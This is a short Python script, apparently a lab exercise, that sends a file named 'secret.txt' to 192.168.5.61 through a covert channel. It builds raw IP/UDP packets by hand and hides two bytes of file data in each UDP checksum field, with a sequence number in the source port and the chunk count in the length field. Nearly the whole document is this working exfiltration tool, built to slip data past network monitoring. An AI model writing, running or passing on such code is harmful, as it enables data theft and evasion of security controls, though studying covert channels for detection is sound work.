import socket
import struct
import os
import math
import time

DEST_IP = "192.168.5.61"
DEST_PORT = 9999
SRC_IP = "192.168.5.61"
CHUNK_SIZE = 2   # bytes per packet (fits in manipulated fields)

def checksum(data):
    if len(data) % 2:
        data += b'\x00'
    s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    return ~s & 0xffff

def build_ip_header(src_ip, dst_ip, payload_len):
    ver_ihl = (4 << 4) + 5
    tos = 0
    tot_len = 20 + 8 + payload_len
    pkt_id = 0x1234
    frag = 0
    ttl = 64
    proto = socket.IPPROTO_UDP
    src = socket.inet_aton(src_ip)
    dst = socket.inet_aton(dst_ip)

    # struct library format specifiers
    # B = int to 1 byte, H = int to 2 bytes, 4s = 4 bytes to 4 bytes
    hdr = struct.pack("!BBHHHBBH4s4s",
        ver_ihl, tos, tot_len, pkt_id,
        frag, ttl, proto, 0, src, dst)
    chk = checksum(hdr)
    return struct.pack("!BBHHHBBH4s4s",
        ver_ihl, tos, tot_len, pkt_id,
        frag, ttl, proto, chk, src, dst)

def build_covert_udp(data_chunk, seq_num, total_chunks):
    payload = b'\x00' * 4
    udp_len = 8 + len(payload) # = 12, the real length

    src_port = seq_num # covert: sequence number
    dst_port = DEST_PORT # now a real fixed port
    covert_length = udp_len + total_chunks # covert: total chunks encoded in length
    covert_chksum = struct.unpack("!H", data_chunk.ljust(2, b'\x00'))[0]  # file data

    return struct.pack("!HHHH",
        src_port,
        dst_port,
        covert_length,
        covert_chksum
    ) + payload

def send_file(filepath):
    with open(filepath, "rb") as f:
        data = f.read()

    chunks = [data[i:i+CHUNK_SIZE] for i in range(0, len(data), CHUNK_SIZE)]
    total = len(chunks)

    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    print(f"[*] Sending '{filepath}' in {total} covert packets...")

    for seq, chunk in enumerate(chunks):
        ip_hdr = build_ip_header(SRC_IP, DEST_IP, 8 + 4)
        udp_hdr = build_covert_udp(chunk, seq, total)
        packet = ip_hdr + udp_hdr

        s.sendto(packet, (DEST_IP, 0))
        time.sleep(0.01)  # small delay to avoid dropped packets

    print(f"[+] Transfer complete. {total} packets sent.")


send_file("secret.txt")
